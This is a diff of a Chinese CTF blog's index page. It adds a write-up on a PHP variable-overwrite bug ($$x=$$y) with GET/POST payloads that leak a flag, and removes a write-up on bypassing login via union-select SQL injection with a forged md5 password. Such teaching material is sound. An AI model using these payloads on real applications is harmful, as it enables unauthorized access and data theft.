@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 11.43px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,94 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-变量覆盖漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  	<time datetime="2021-09-01T16:00:00.000Z" itemprop="datePublished">2021-09-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">
+        变量覆盖漏洞
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h1><p>打开页面，然后用dirsearch扫描。发现.git文件泄露<br>flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">file_get_contents(&#x27;/flag&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p> index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$yds = &quot;dog&quot;;</span><br><span class="line">$is = &quot;cat&quot;;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;	//GET方式传flag只能传一个flag=flag</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;	//GET和POST其中之一必须传flag</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;	//GET和POST传flag,必须不能是flag=flag</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure>
+
+<p>exit()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit()函数会输出一条信息后退出</span><br></pre></td></tr></table></figure>
+<p>我们可以利用这个exit()函数来对调用flag.php文件里的file_get_contents(‘/flag’)，读出flag出来</p>
+<p>因此我们看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x=&gt;$y)&#123;</span><br><span class="line">	$$x=$$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>中的$$x和$$y，我们可以看到有变量覆盖漏洞，因此我们get提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure>
+<p>让$x=yds，$y=flag，所以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”$$x==$$y“相当于”$yds=$flag“</span><br></pre></td></tr></table></figure>
+<p>所以我们要办法利用exit($yds)，因此我们要通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))</span><br></pre></td></tr></table></figure>
+<p>这一个条件，所以我们要让$_GET[‘flag’]和$_POST[‘flag’]不存在，所以之前构造的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure>
+<p>便符合条件</p>
+<p>而如果想利用exit($is)的话，我们可以利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">	$$x=$$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>构造get提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag</span><br></pre></td></tr></table></figure>
+<p>便会构成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”$$x=$$y“相当于”$is=$flag“</span><br></pre></td></tr></table></figure>
+<p>然后我们经过以下条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)</span><br></pre></td></tr></table></figure>
+<p>所以get要提交的参数flag或post要提交参数flag，所以可以构造paload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">get提交：?is=flag</span><br><span class="line">post提交：flag=flag</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-phpmyadmin任意包含文件漏洞及任意代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -835,81 +923,9 @@
 
 
   
-    <article id="post-逻辑sql注入" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/08/27/%E9%80%BB%E8%BE%91sql%E6%B3%A8%E5%85%A5/" class="article-date">
-  	<time datetime="2021-08-26T16:00:00.000Z" itemprop="datePublished">2021-08-27</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/27/%E9%80%BB%E8%BE%91sql%E6%B3%A8%E5%85%A5/">
-        逻辑sql注入
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="逻辑sql注入"><a href="#逻辑sql注入" class="headerlink" title="逻辑sql注入"></a>逻辑sql注入</h1><p>关键词判断</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">联合注入：unin被过滤</span><br><span class="line">报错注入：and、or、updatexml被过滤</span><br><span class="line">bool注入和time注入：and、or被过滤</span><br></pre></td></tr></table></figure>
-
-<p>打开页面源码，看到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br></pre></td></tr></table></figure>
-<p>由于base32的特征是纯大写+数字，所以进行base32解密，得到有等于号的字母加数字，猜测是base64，进行base64解密，得到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>
-<p>可见在username中有注入点，由于=和or被过滤，所以可以使用&lt;&gt;或like来代替=，用0r来代替or，不过也报错</p>
-<p>因此，我们可以从后端逻辑出发，一般是：先检索数据。拿出username的键值来进行对比，如果错误，则报错，如果正确，则进行下一步，再拿password的键值与我们输入的password进行比较</p>
-<p>不过放在数据库里用于比较的键值都是加密的，加密方式有mysql、mysql5、md5等，我们可以猜想它的工作的代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$data = 检索数据。</span><br><span class="line">if ($data[&#x27;username&#x27;] === &#x27;admin&#x27;) &#123;</span><br><span class="line">	if ($data[&#x27;password&#x27;] === md5($pw)) &#123;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>因此我们可以使用联合注入来操纵检索数据，一般数据列中的字段都是id,username,password，所以构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1,admin,输入密码的md5值%23&amp;pw=输入密码</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
     </nav>
   
 </div>
